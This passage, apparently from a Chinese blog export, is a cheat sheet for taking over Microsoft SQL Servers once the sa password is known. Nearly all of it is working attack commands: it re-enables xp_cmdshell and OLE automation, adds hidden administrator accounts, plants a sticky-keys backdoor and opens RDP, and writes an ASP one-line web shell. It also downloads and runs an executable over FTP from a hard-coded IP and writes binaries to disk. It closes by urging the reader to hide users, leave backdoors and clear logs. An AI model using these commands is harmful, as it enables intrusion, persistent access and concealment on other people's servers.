xp_loginconfig,'xplog70.dll'&#160; <br />exec sp_addextendedproc xp_enumerrorlogs,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_getfiledetails,'xpstar.dll'&#160; <br />exec sp_addextendedproc sp_OACreate,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OADestroy,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OAGetErrorInfo,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OAGetProperty,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OAMethod,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OASetProperty,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OAStop,'odsole70.dll'&#160; <br />exec sp_addextendedproc xp_regaddmultistring,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regdeletekey,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regdeletevalue,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regenumvalues,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regread,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regremovemultistring,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regwrite,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_availablemedia,'xpstar.dll'<br /><br /><br />--------------------------------------------------------------------------------------<br />一.更改sa口令方法：<br />用sql综合利用工具连接后，执行命令：<br />exec sp_password NULL,'新密码','sa'<br />(提示：慎用!)<br /><br />二.简单修补sa弱口令.<br />方法1:查询分离器连接后执行：<br />if exists (select * from<br />dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]') and<br />OBJECTPROPERTY(id, N'IsExtendedProc') = 1)<br />exec sp_dropextendedproc N'[dbo].[xp_cmdshell]'<br />GO<br />然后按F5键命令执行完毕<br /><br />方法2:查询分离器连接后<br />第一步执行：use master<br />第二步执行：sp_dropextendedproc 'xp_cmdshell'<br />然后按F5键命令执行完毕<br /><br />无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）<br />恢复方法：查询分离器连接后,<br />第一步执行：sp_dropextendedproc &quot;xp_cmdshell&quot;<br />第二步执行：sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'<br /><br />无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)<br />恢复方法：查询分离器连接后,<br />第一步执行:exec sp_dropextendedproc 'xp_cmdshell'<br />第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll'&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <br />然后按F5键命令执行完毕<br /><br />如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:<br />查询分离器连接后,<br />2000servser系统:<br />declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:winntsystem32cmd.exe /c net user Web hacker /add'<br />declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:winntsystem32cmd.exe /c net localgroup administrators Web /add'<br />xp或2003server系统: 126错误！命令<br />declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:windowssystem32cmd.exe /c net user Web$ hacker /add'<br />declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:windowssystem32cmd.exe /c net localgroup administrators Web$ /add'<br />=======================================================================<br />找不到存储过程 sp_addextendedproc<br />解决方法:<br />create procedure sp_addextendedproc --- 1996/08/30 20:13<br />@functname nvarchar(517),/* (owner.)name of function to call */<br />@dllname varchar(255)/* name of DLL containing function */<br />as<br />set implicit_transactions off<br />if @@trancount &gt; 0<br />begin<br />raiserror(15002,-1,-1,'sp_addextendedproc')<br />return (1)<br />end<br />dbcc addextendedproc( @functname, @dllname)<br />return (0) -- sp_addextendedproc<br />GO<br />这段代码贴入查询分离器,执行<br />查看目录<br />exec master.dbo.xp_subdirs 'c:'<br />列出磁盘<br />e\nxec master..xp_fixeddrives<br />xpsql.cpp: 错误 5 来自 CreateProcess（第 737 行） 直接加帐号！<br />EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWareMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',0<br />Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:windowssystem32iasias.mdb','select shell(&quot;net user 123 123 /add&quot;)');<br />Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:windowssystem32iasias.mdb','select shell(&quot;net localgroup administrators 123 /add&quot;)');<br />=======================================================================<br />开3389：<br />exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEMCurrentControlSetControlTerminal Server','fDenyTSConnections','REG_DWORD',0;--<br />关3389：<br />exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEMCurrentControlSetControlTerminal Server','fDenyTSConnections','REG_DWORD',1;<br />查看3389端口<br />exec xp_regread 'HKEY_LOCAL_MACHINE','SYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp','PortNumber'<br />普通CMD后门<br />xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe','debugger','reg_sz','c:windowssystem32cmd.exe'<br /><br />建立用户1-这里默认用户是Reconditeness密码9527可自行修改<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:winntsystem32iasias.mdb','select shell(&quot;cmd.exe /c net1 user Reconditeness 9527 /ad &amp;net localgroup administrators terks /ad&quot;)')<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:windowssystem32iasias.mdb','select shell(&quot;cmd.exe /c net1 user Reconditeness 9527 /ad &amp;net localgroup administrators terks /ad&quot;)')<br /><br />win2K直接上PS马<br />exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:winntsystem32iasias.mdb','select shell(&quot;cmd.exe /c @echo open 60.190.176.85&gt;&gt;net.txt&amp;@echo reconditeness&gt;&gt;net.txt&amp;@echo 7259&gt;&gt;net.txt&amp;@echo get 0.exe&gt;&gt;net.txt&amp;@echo bye&gt;&gt;net.txt&amp;@ftp -s:net.txt&amp;del net.txt &amp; 0.exe&quot;)')<br /><br />win03-XP直接上PS马<br />exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:windowssystem32iasias.mdb','select shell(&quot;cmd.exe /c @echo open 60.190.176.85&gt;&gt;net.txt&amp;@echo reconditeness&gt;&gt;net.txt&amp;@echo 7259&gt;&gt;net.txt&amp;@echo get 0.exe&gt;&gt;net.txt&amp;@echo bye&gt;&gt;net.txt&amp;@ftp -s:net.txt&amp;del net.txt &amp; 0.exe&quot;)')<br /><br />shift后门命令<br />declare @o int<br />exec sp_oacreate 'scripting.filesystemobject', @o out<br />exec sp_oamethod @o, 'copyfile',null,'c:windowsexplorer.exe' ,'c:windowssystem32sethc.exe';<br />declare @o int<br />exec sp_oacreate 'scripting.filesystemobject', @o out<br />exec sp_oamethod @o, 'copyfile',null,'c:windowssystem32sethc.exe' ,'c:windowssystem32dllcachesethc.exe';<br />copy c:windowsexplorer.exe c:windowssystem32sethc.exe<br />copy c:windowssystem32sethc.exe c:windowssystem32dllcachesethc.exe<br /><br />declare @o int<br />exec sp_oacreate 'wscript.shell', @o out<br />exec sp_oamethod @o, 'run', NULL, 'XXXXX' XXXXX为你要执行的命令<br /><br /><br />开3389<br />REG ADD HKLMSYSTEMCurrentControlSetControlTerminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f<br /><br />SQL写一句话<br />exec master.dbo.xp_subdirs 'd:webcdlxkj';<br />exec sp_makewebtask 'd:webcdlxkjXX.asp','select''&lt;%execute(request(&quot;SB&quot;))%&gt;'' '<br />SA沙盒模式提权-----<br />----------------------<br />exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',0;<br />-------------------------------------------------------<br />Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:windowssystem32iasias.mdb','select shell(&quot;net user sql$ 123 /add&quot;)');<br />-------------------------------------------------------<br />Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:windowssystem32iasias.mdb','select shell(&quot;net localgroup administrators sql$ /add&quot;)');<br /><br />SHIFT<br />入侵<br />EXEC master..xp_regwrite<br />@rootkey='HKEY_LOCAL_MACHINE',<br />@key='SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.EXE',<br />@value_name='Debugger',<br />@type='REG_SZ',<br />@value='C:WINDOWSexplorer.exe'<br />整个过程是利用master..xp_regwrite这组件来完成的,<br /><br />1.sql命令查询注册表粘滞键是否被劫持<br />exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe','Debugger'<br />2.sql命令劫持注册表粘滞键功能,替换成任务管理器(当然你也可以替换成你想要的其他命令)<br />xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe',<br />'Debugger','REG_SZ','C:WINDOWSsystem32taskmgr.exe'<br />3.sql命令删除注册表粘滞键的劫持功能保护你的服务器不再被他人利用<br />xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe'<br /><br />sql写文件<br />declare @o int, @f int, @t int, @ret int<br />exec sp_oacreate 'scripting.filesystemobject', @o out<br />exec sp_oamethod @o, 'createtextfile', @f out, 'c:1.vbs', 1<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;)'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create(&quot;user&quot;,&quot;test&quot;)'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword &quot;1234&quot;'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo '<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&amp;&quot;/test&quot;,user) '<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&amp;&quot;/test&quot;'<br />exec master..xp_cmdshell 'cscript c:1.vbs'<br /><br />无NET提权的脚本<br />struser=wscript.arguments(0)<br />strpass=wscript.arguments(1)<br />set lp=createObject(&quot;WSCRIPT.NETWORK&quot;)<br />oz=&quot;WinNT://&quot;&amp;lp.ComputerName<br />Set ob=GetObject(oz)<br />Set oe=GetObject(oz&amp;&quot;/Administrators,group&quot;)<br />Set od=ob.create(&quot;user&quot;,struser)<br />od.SetPassword strpass<br />od.SetInfo<br />Set of=GetObject(oz&amp;&quot;/&quot; &amp; struser &amp; &quot;,user&quot;)<br />oe.Add(of.ADsPath)<br />For Each admin in oe.Members<br />if struser=admin.Name then<br />Wscript.echo struser &amp; &quot; 建立成功!&quot;<br />wscript.quit<br />end if<br />Next<br />Wscript.echo struser &amp; &quot; 用户建立失败!&quot;<br />将以上保存为user.VBS文件<br />然后执行：cscript user.vbs 用户名 密码<br /><br />=======================================================================<br />恢复xp_cmdshell<br />exec sp_dropextendedproc 'xp_cmdshell'<br />EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int<br />=======================================================================<br />开启xp_cmdshell<br />USE master<br />EXEC sp_configure 'show advanced options', 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'xp_cmdshell', 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'show advanced options', 0<br />=======================================================================<br />开启Automation Procedures<br />USE master<br />EXEC sp_configure 'show advanced options', 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'Ole Automation Procedures',1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configur\ne 'show advanced options', 0<br />=======================================================================<br />开启Distributed Queries<br />USE master<br />EXEC sp_configure 'show advanced options', 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'Ad Hoc Distributed Queries',1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'show advanced options', 0<br />=======================================================================<br />恢复Xp_regwrite<br />EXEC sp_dropextendedproc 'Xp_regwrite'<br />exec sp_addextendedproc xp_regwrite,'xpstar.dll'<br />=======================================================================<br />恢复sp_OACreate<br />dbcc addextendedproc (&quot;sp_OACreate&quot;,&quot;odsole70.dll&quot;)<br />exec sp_addextendedproc sp_OAMethod,'odsole70.dll'<br />=======================================================================<br />cmdshell开3389<br />exec master..xp_cmdshell 'echo Windows Registry Editor Version 5.00&gt;c:3389.reg'<br />exec master..xp_cmdshell 'echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server]&gt;&gt;c:3389.reg'<br />exec master..xp_cmdshell 'echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;c:3389.reg'<br />exec master..xp_cmdshell 'regedit /s c:3389.reg'<br />exec master..xp_cmdshell 'del c:3389.reg'<br />=======================================================================<br />cmdshell添加用户<br />insert resultcmd_cc exec master..xp_cmdshell 'net user 用户 密码 /add'<br />insert resultcmd_cc exec master..xp_cmdshell 'net user 用户 密码'<br />insert resultcmd_cc exec master..xp_cmdshell 'net user 用户 /active:yes'<br />insert resultcmd_cc exec master..xp_cmdshell 'net localgroup administrators 用户 /add'<br />=======================================================================<br />oacreate添加用户<br />DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out<br />EXEC sp_oamethod @s,[run], NULL, [net user support$ support /add]<br />EXEC sp_oamethod @s,[run], NULL, [net localgroup administrators support /add]<br />=======================================================================<br />regwrite添加用户<br />Exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',0<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=iasdnary.mdb','select shell(&quot;net user 用户 密码 /add&quot;)')<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=iasdnary.mdb','select shell(&quot;net localgroup administrators 用户 /add&quot;)')<br />=======================================================================<br />cmdshell模式FTP下载:<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo open FTP地址&gt;sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo 123 &gt;&gt;sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo 123 &gt;&gt;sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo get 1433.exe sly.exe&gt;&gt;sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo bye &gt;&gt;sly.sys]'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c ftp -s:sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c del sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c sly.exe'<br />=======================================================================<br />oacreate模式FTP下载:<br />DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo open FTP地址&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo 123 &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo 123 &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo get 1433.exe sly.exe&gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo bye &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c ftp -s:sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c del sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c sly.exe]<br />=======================================================================<br />不需要XP_CMDSHLL执行CMD命令<br />exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:winntsystem32iasias.mdb','select shell(&quot;cmd.exe /c net user 用户 密码 /add.&quot;)')<br />exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:winntsystem32iasias.mdb','select shell(&quot;cmd.exe /c net localgroup administrators 用户 /add.&quot;)')<br />=======================================================================<br />SQL Server 阻止了对组件 'Ole Automation Procedures' 的 过程'sys.sp_OACreate' 的访问<br />sp_configure 'show advanced options', 1;<br />GO<br />RECONFIGURE;<br />GO<br />sp_configure 'Ole Automation Procedures', 1;<br />GO<br />RECONFIGURE;<br />GO<br />=============================================<br />错误5是个系统提示的错误号，CreateProcess这个是创建线程的意思，这个错误产生和系统文件cmd.exe有很大的关系，一种情况是cmd被删除，一种是cmd的权限被降低了.<br />SQL查看终端端口及开放情况：<br />exec master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp','PortNumber'<br />好了，下面关键的地方了，要用到两条sql指令，将系统的explorer文件复制为系统的shift后门文件，下面两条语句为分别执行的，不可以放在一起执行，我是在sql tools 2.0工具里执行的，你也可以在分离器中执行，记得分别执行。<br />//这条语句将explorer.exe复制为sethc.exe<br />declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:windowsexplorer.exe','c:windowssystem32sethc.exe';<br />//这条语句将sethc.exe复制到dllcache目录下<br />declare @oo int exec sp_oacreate 'scripting.filesystemobject', @oo out exec sp_oamethod @oo, 'copyfile',null,'c:windowssystem32sethc.exe','c:windowssystem32dllcachesethc.exe';<br />这个两条语句执行的时间间隔最好不超过10秒钟，否则系统会自动恢复原来的文件。<br />另外这两条语句使用到的sp_oacreate存储过程需要使用到odsole70.dll这个文件，所以这个文件的存亡，关系到创建的成功与否。<br />=======================================================================<br />删除：<br />use master<br />exec sp_dropextendedproc 'xp_cmdshell'<br />exec sp_dropextendedproc 'xp_dirtree'<br />exec sp_dropextendedproc 'xp_enumgroups'<br />exec sp_dropextendedproc 'xp_fixeddrives'<br />exec sp_dropextendedproc 'xp_loginconfig'<br />exec sp_dropextendedproc 'xp_enumerrorlogs'<br />exec sp_dropextendedproc 'xp_getfiledetails'<br />exec sp_dropextendedproc 'Sp_OACreate'<br />exec sp_dropextendedproc 'Sp_OADestroy'<br />exec sp_dropextendedproc 'Sp_OAGetErrorInfo'<br />exec sp_dropextendedproc 'Sp_OAGetProperty'<br />exec sp_dropextendedproc 'Sp_OAMethod'<br />exec sp_dropextendedproc 'Sp_OASetProperty'<br />exec sp_dropextendedproc 'Sp_OAStop'<br />exec sp_dropextendedproc 'Xp_regaddmultistring'<br />exec sp_dropextendedproc 'Xp_regdeletekey'<br />exec sp_dropextendedproc 'Xp_regdeletevalue'<br />exec sp_dropextendedproc 'Xp_regenumvalues'<br />exec sp_dropextendedproc 'Xp_regread'<br />exec sp_dropextendedproc 'Xp_regremovemultistring'<br />exec sp_dropextendedproc 'Xp_regwrite'<br />drop procedure sp_makewebtask<br />go<br />----------------------------------------------------------------------------------<br />----------------------<br />--列出当前计算机名称--<br />----------------------<br />execute master..xp_getnetname<br />--------------------------------<br />-列出当前计算机的驱动器可用空间-<br />--------------------------------<br />execute master..xp_fixeddrives<br />========================<br />==列出服务器所有本地组==<br />========================\n<br />execute master..xp_enumgroups<br />======================<br />==获取MS SQL的版本号==<br />======================<br />execute master..sp_msgetversion<br />=========================================<br />==参数说明:目录名,目录深度,是否显示文件==<br />=========================================<br />execute master..xp_dirtree 'c:'<br />execute master..xp_dirtree 'c:',1<br />execute master..xp_dirtree 'c:',1,1<br />--------------------------------------------------------------------------------------------------------<br />sql2005<br />恢复xp_cmdshell<br />EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;<br />关闭:<br />EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;<br />-------------------------------------------------------------------------------------------------------------<br />把要转的文件拖到脚本上去, 就会生成包含HEX代码的文本.<br />然后用以下方法写入到对方计算机中。DECLARE @ObjectToken INT<br />EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT<br />EXEC sp_OASetProperty @ObjectToken, 'Type', 1<br />EXEC sp_OAMethod @ObjectToken, 'Open'<br />EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x123456(其中0x123456为HEX内容)<br />EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, 'Test.exe(文件名)', 2<br />EXEC sp_OAMethod @ObjectToken, 'Close'<br />EXEC sp_OADestroy @ObjectToken<br />复制代码写入之后, 就发挥你的办法去执行你写入的这个文件就OK了<br />FILE2HEX.VBS<br />On Error Resume Next<br />FilePath = Wscript.Arguments(0)<br />FieName = Right(FilePath, Len(FilePath) - InStrRev(FilePath, &quot;&quot;))<br />With CreateObject(&quot;Adodb.Stream&quot;)<br />.Type = 1: .open: .loadfromfile FilePath: Str = .read: Sl = LenB(Str)<br />End With<br /><br />Sll = Sl Mod 65536: Slh = Sl  65536<br />With CreateObject(&quot;Scripting.FileSystemObject&quot;).OpenTextFile(FilePath &amp; &quot;.txt&quot;, 2, True)<br />.Write &quot;0x&quot;<br />For i = 1 To Sl<br />bt = AscB(MidB(Str, i, 1))<br />If bt &lt; 16 Then .Write &quot;0&quot;<br />.Write Hex(bt)<br />Next<br />End With<br /><br />进去服务器后，创建隐藏用户。防止后门，清理日志，走人。。<br />嘿嘿，最后嘱咐一下，缺德的时候别多做。。看看就行，，","slug":"1433提权","published":1,"updated":"2023-04-22T05:38:44.610Z","_id":"clgrjlxb6000d7opif1zz3mvm","comments":1,"layout":"post","photos":[],"link":"","content":"<p>当你获得数据库的管理密码时，你还犹豫什么。提权吧、<br /><br />注意SQLDebuggerr用户<br />echo y|cacls c:windowssystem32net1.exe &#x2F;p everyone:f<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br /><br />Error Message:未能找到存储过程 ‘master..xp_cmdshell’<br />修复法：很通用的，其实碰到 其他126 127的都可以一起修复，<br />除了xplog70.dll其他的都可以用这命令修复<br />第一步先删除：<br />drop procedure sp_addextendedproc<br />drop procedure sp_oacreate<br />exec sp_dropextendedproc ‘xp_cmdshell’<br /><br />第二步恢复：<br />dbcc addextendedproc (&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)<br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)<br /><br />未能找到存储过程 ‘master..xp_cmdshell’<br />第一步:<br />create procedure sp_addextendedproc — 1996&#x2F;08&#x2F;30 20:13<br />@functname nvarchar(517),&#x2F;* (owner.)name of function to call<br /><em>&#x2F;<br />@dllname varchar(255)&#x2F;</em> name of DLL containing function <em>&#x2F;<br />as<br />set implicit_transactions off<br />if @@trancount &gt; 0<br />begin<br />raiserror(15002,-1,-1,’sp_addextendedproc’)<br />return (1)<br />end<br />dbcc addextendedproc( @functname, @dllname)<br />return (0) – sp_addextendedproc<br />GO<br />第二步:<br />EXEC sp_addextendedproc xp_cmdshell,@dllname &#x3D;’xplog70.dll’declare @o int<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />恢复cmdshell的sql语句<br />exec sp_addextendedproc xp_cmdshell ,@dllname &#x3D;’xplog70.dll’<br />开启cmdshell的sql语句<br />exec sp_addextendedproc xp_cmdshell ,@dllname &#x3D;’xplog70.dll’<br /><br />判断存储扩展是否存在<br />select count(</em>) from master.dbo.sysobjects where xtype&#x3D;’x’ and name&#x3D;’xp_cmdshell’<br />返回结果为1就ok<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br /><br />SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。有关启用 ‘xp_cmdshell’ 的详细信息，请参阅 SQL Server 联机丛书中的 &quot;外围应用配置器&quot;。<br />;EXEC sp_configure ‘show advanced options’, 1 –<br />;RECONFIGURE WITH OVERRIDE –<br />;EXEC sp_configure ‘xp_cmdshell’, 1 –<br />;RECONFIGURE WITH OVERRIDE –<br />;EXEC sp_configure&amp;#160;&amp;#160; ‘show advanced options’, 0 –<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br /><br />xplog70.dll修复：<br />Error Message:无法装载 DLL xplog70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。<br />修复XPLOG70.DLL（先用文件查看下备份的目录下x86bin,然后把下面目录替换）<br />第一步<br />exec sp_dropextendedproc ‘xp_cmdshell’<br />第二步<br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;c:sql2ksp4x86binnxplog70.dll&quot;)<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br /><br />恢复扩展存储过程的办法<br />先恢复sp_addextendedproc，语句如下：<br />第一：<br />create procedure sp_addextendedproc — 